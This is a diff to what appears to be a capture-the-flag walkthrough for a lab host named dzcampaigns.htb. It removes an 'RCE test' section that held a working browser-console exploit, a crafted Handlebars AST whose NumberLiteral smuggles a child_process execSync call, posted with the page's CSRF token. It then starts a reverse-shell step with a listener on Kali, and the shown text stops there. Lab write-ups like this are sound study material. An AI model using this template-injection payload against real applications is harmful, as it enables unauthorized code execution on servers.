@@ -72,39 +72,9 @@ echo "TARGET_IP dzcampaigns.htb" | sudo tee -a /etc/hosts
 
 Then at `http://dzcampaigns.htb/register`, create a character; note the character ID from the edit URL (`/character/<ID>/edit`). Below assumes ID 15.
 
-### RCE test
+### Reverse shell.
 
-At `http://dzcampaigns.htb/character/15/edit` → DevTools → Console:
-
-```javascript
-const csrf = document.querySelector('[name="_csrf"]').value;
-const L = { start: { line: 1, column: 0 }, end: { line: 1, column: 1 } };
-const ast = {
-  type: "Program",
-  body: [{
-    type: "MustacheStatement",
-    path: { type: "PathExpression", data: false, depth: 0, parts: ["lookup"], original: "lookup", loc: L },
-    params: [
-      { type: "PathExpression", data: false, depth: 0, parts: [], original: "this", loc: L },
-      { type: "NumberLiteral",
-        value: "{},{})) + process.mainModule.require('child_process').execSync('id').toString() //",
-        original: 1, loc: L }
-    ],
-    escaped: true, strip: { open: false, close: false }, loc: L
-  }],
-  strip: {}, loc: L
-};
-const r = await fetch("/character/15", {
-  method: "POST", credentials: "same-origin",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ _csrf: csrf, name: "Testchar", race: "Elf", class: "Rogue", backstory: "test", campaign_message: ast })
-});
-console.log(r.status, await r.text());
-```
-
-Read result at `http://dzcampaigns.htb/campaign/1` — expect `uid=996(darkzero)`.
-
-**3.2 — reverse shell.** Listener on Kali:
+** Start a listener on Kali:
 
 bash
 
